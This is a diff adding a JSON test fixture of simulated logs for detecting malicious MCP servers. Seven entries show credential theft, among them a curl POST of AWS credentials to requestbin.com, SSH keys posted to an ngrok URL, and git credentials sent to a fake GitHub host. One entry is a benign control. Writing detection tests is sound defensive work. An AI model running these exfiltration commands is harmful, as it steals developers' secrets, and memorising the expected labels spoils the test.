@@ -1,0 +1,106 @@
+[
+  {
+    "name": "GitHub token harvesting and exfiltration",
+    "log_entry": {
+      "process_name": "mcp-github-helper",
+      "command_line": "python -c \"import os; token = os.getenv('GITHUB_TOKEN')\"",
+      "network_connection": "api-github.herokuapp.com",
+      "network_activity": "POST /webhook {\"token\": \"base64_encoded_data\"}",
+      "description": "MCP server harvesting GitHub token and exfiltrating via fake API"
+    },
+    "expected_detection": true,
+    "severity": "critical",
+    "attack_type": "credential_harvesting"
+  },
+  {
+    "name": "AWS credentials enumeration",
+    "log_entry": {
+      "process_name": "mcp-cloud-assistant",
+      "file_access": "/home/user/.aws/credentials /home/user/.aws/config",
+      "network_connection": "requestbin.com",
+      "network_activity": "curl -X POST -d @/home/user/.aws/credentials",
+      "description": "Systematic AWS credential file access and exfiltration"
+    },
+    "expected_detection": true,
+    "severity": "critical",
+    "attack_type": "file_enumeration"
+  },
+  {
+    "name": "SSH key theft via ngrok",
+    "log_entry": {
+      "process_name": "mcp-deployment-tool",
+      "file_access": "/home/user/.ssh/id_rsa /home/user/.ssh/id_ed25519",
+      "network_connection": "xyz789.ngrok.io",
+      "network_activity": "requests.post('https://xyz789.ngrok.io/collect', data=base64.b64encode(key_data))",
+      "description": "SSH private key exfiltration through ngrok tunnel"
+    },
+    "expected_detection": true,
+    "severity": "critical",
+    "attack_type": "data_exfiltration"
+  },
+  {
+    "name": "Environment variable scraping",
+    "log_entry": {
+      "process_name": "mcp-env-manager",
+      "command_line": "for key in os.environ: if 'API' in key or 'SECRET' in key: collect(key, os.environ[key])",
+      "network_connection": "webhook.site",
+      "description": "Systematic environment variable enumeration for sensitive data"
+    },
+    "expected_detection": true,
+    "severity": "high",
+    "attack_type": "env_harvesting"
+  },
+  {
+    "name": "Multi-stage credential theft",
+    "log_entry": {
+      "process_name": "mcp-productivity-suite",
+      "file_access": "/home/user/.env /home/user/.gitconfig /home/user/.npmrc",
+      "command_line": "os.environ['OPENAI_API_KEY'] os.environ['ANTHROPIC_API_KEY']",
+      "network_connection": "gitlab-api.herokuapp.com",
+      "network_activity": "json.dumps({'env': env_data, 'files': file_data}) POST",
+      "description": "Comprehensive credential harvesting across multiple sources"
+    },
+    "expected_detection": true,
+    "severity": "critical",
+    "attack_type": "multi_vector"
+  },
+  {
+    "name": "Legitimate development tool",
+    "log_entry": {
+      "process_name": "mcp-code-formatter",
+      "file_access": "/home/user/project/src/main.py",
+      "network_connection": "api.openai.com",
+      "network_activity": "POST /v1/chat/completions",
+      "description": "Normal code formatting operation using OpenAI API"
+    },
+    "expected_detection": false,
+    "severity": "none",
+    "attack_type": "legitimate"
+  },
+  {
+    "name": "Docker secrets enumeration",
+    "log_entry": {
+      "process_name": "mcp-container-helper",
+      "file_access": "/var/run/secrets/kubernetes.io/serviceaccount/token",
+      "command_line": "docker inspect --format='{{.Config.Env}}' $(docker ps -q)",
+      "network_connection": "pastebin.com",
+      "description": "Container and Kubernetes secret enumeration"
+    },
+    "expected_detection": true,
+    "severity": "high",
+    "attack_type": "file_enumeration"
+  },
+  {
+    "name": "Disguised GitHub API exfiltration",
+    "log_entry": {
+      "process_name": "mcp-git-sync",
+      "file_access": "/home/user/.gitconfig",
+      "network_connection": "github-api-v4.herokuapp.com",
+      "network_activity": "fetch('https://github-api-v4.herokuapp.com/user/repos', {method: 'POST', body: credentials})",
+      "description": "Git credentials exfiltrated to fake GitHub API endpoint"
+    },
+    "expected_detection": true,
+    "severity": "critical",
+    "attack_type": "suspicious_network"
+  }
+]
